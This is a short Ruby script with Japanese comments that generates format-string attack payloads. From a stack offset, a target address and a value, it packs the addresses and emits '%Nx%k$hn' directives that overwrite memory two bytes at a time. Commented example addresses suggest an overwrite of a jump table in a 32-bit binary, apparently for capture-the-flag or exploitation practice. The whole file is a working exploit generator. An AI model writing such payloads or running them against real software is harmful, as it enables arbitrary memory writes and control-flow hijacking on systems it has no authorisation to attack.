#!/usr/bin/env ruby
require 'pry'

def pack(hex_str)
  [hex_str].pack('V')
end

def unpack(hex_str)
  hex_str.unpack('V')[0]
end

if ARGV.size < 3
  warn "#{File.basename($0)} pos dest_hex data_hex"
  warn "Don't out newline"
  exit 1
end

$VERBOSE = nil unless ENV['DEBUG']

# スタックの位置
pos = ARGV[0].to_i

# destination base
# dest = 0x080499fc
dest = ARGV[1].to_i(16)

# data to be written
# data_value = 0x8048691
data_value = ARGV[2].to_i(16)


# 下位から書き込むために分割&reverse
data    = data_value.to_s(16).reverse.scan(/.{1,4}/).map{|s| s.reverse.to_i(16)}
stage   = data.size # 分割数
dests   = stage.times.map{|i| pack(dest+0x2*i)}
value   = dests.map(&:size).inject(&:+)
values  = data.unshift(value).each_cons(2).map{|val,num| (num-val)%0x10000}
payload = values.map.with_index{|v,i| "%#{v}x%#{pos+i}$hn"}.inject(&:+)

warn "dests #{dests.map{|n| unpack(n).to_s(16)}}"
warn "values #{values}"
warn "payload \"#{payload}\""

print dests.inject(&:+) + payload
